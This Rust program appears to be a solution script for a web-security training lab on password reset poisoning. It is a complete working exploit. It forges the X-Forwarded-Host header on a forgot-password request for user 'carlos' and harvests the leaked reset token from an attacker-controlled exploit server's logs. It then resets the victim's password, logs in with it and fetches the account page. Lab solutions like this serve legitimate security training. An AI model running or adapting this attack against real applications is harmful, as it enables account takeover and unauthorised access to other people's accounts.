/***************************************************************
*
* Lab: Password reset poisoning via middleware
*
* Hack Steps: 
*      1. Make forgot-password request as carlos with 
*         the X-Forwarded-Host changed
*      2. Extract the token from the server logs
*      3. Change carlos password with the obtained token
*      4. Login as carlos with the new password
*      5. Fetch carlos profile
*
****************************************************************/
#![feature(ascii_char)]
use lazy_static::lazy_static;
use regex::{self, Regex};
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use std::{collections::HashMap, time::Duration};
use text_colorizer::Colorize;

const LAB_URL: &str = "https://0adc005a04aafacc802d44e000ec005c.web-security-academy.net"; // Change this to your lab URL
const EXPLOIT_SERVER_DOMAIN: &str = "exploit-0ac40090040efa578028433101c00020.exploit-server.net"; // Change this to your exploit server DOMAIN
const NEW_CARLOS_PASSWORD: &str = "Hacked"; // You can change this to what you want

lazy_static! {
    static ref WEB_CLIENT: Client = build_web_client();
}

fn main() {
    print!("⦗1⦘ Making forgot-password request as carlo with the X-Forwarded-Host changed.. ");

    making_forgot_password_request_as_carlos();

    println!("{}", "OK".green());
    print!("⦗2⦘ Extracting the token from the server logs.. ");

    let log_page = fetch_server_logs();
    let token = get_token_from_logs(log_page);

    println!("{}", "OK".green());
    print!("⦗3⦘ Changing carlos password with the obtained token.. ");

    change_carlos_password(&token);

    println!("{}", "OK".green());
    println!("🗹 Password was changed to: {}", NEW_CARLOS_PASSWORD.green());
    print!("⦗4⦘ Logging in as carlos with the new password.. ");

    let login_as_carlos = login_as_carlos();

    println!("{}", "OK".green());
    print!("⦗5⦘ Fetching carlos profile.. ");

    let session = get_session_cookie(&login_as_carlos);
    fetch_with_session("/my-account", &session);

    println!("{}", "OK".green());
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn making_forgot_password_request_as_carlos() {
    WEB_CLIENT
        .post(&format!("{LAB_URL}/forgot-password"))
        .form(&HashMap::from([("username", "carlos")]))
        .header("X-Forwarded-Host", EXPLOIT_SERVER_DOMAIN)
        .send()
        .expect(&format!(
            "{}",
            "⦗!⦘ Failed to change the dynamically generated link".red()
        ));
}

fn fetch_server_logs() -> Response {
    WEB_CLIENT
        .get(format!("https://{EXPLOIT_SERVER_DOMAIN}/log"))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to fetch the logs".red()))
}

fn get_token_from_logs(log_page: Response) -> String {
    let body = log_page.text().unwrap();
    let token = capture_pattern_from_text("temp-forgot-password-token=(.*) HTTP", &body);
    token
}

fn change_carlos_password(token: &str) -> Response {
    WEB_CLIENT
        .post(format!("{LAB_URL}/forgot-password"))
        .form(&HashMap::from([
            ("temp-forgot-password-token", token),
            ("new-password-1", NEW_CARLOS_PASSWORD),
            ("new-password-2", NEW_CARLOS_PASSWORD),
        ]))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to change carlos password".red()))
}

fn login_as_carlos() -> Response {
    WEB_CLIENT
        .post(format!("{LAB_URL}/login"))
        .form(&HashMap::from([
            ("username", "carlos"),
            ("password", NEW_CARLOS_PASSWORD),
        ]))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to change carlos password"))
}

fn fetch_with_session(path: &str, session: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}{path}"))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn get_session_cookie(response: &Response) -> String {
    let headers = response.headers();
    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
    capture_pattern_from_text("session=(.*);", cookie_header)
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures_iter(text).last().expect(&format!(
        "⦗!⦘ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}
